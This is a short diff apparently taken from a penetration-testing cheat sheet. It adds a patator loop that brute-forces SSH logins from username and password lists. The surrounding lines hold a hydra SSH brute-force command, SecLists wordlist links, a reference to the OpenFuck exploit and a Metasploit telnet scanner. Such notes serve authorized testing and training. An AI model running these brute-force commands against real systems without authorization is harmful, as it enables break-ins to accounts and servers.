@@ -171,6 +171,7 @@ OpenFuck => https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2
 	https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
 	https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt
 	hydra -L USERS.txt -P PASS.txt -vV IP ssh
+	for user in $(cat users.txt); do echo $user && patator ssh_login host=IP user=$user password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'; done
 
 #TELNET
 use auxiliary/scanner/telnet/telnet_version
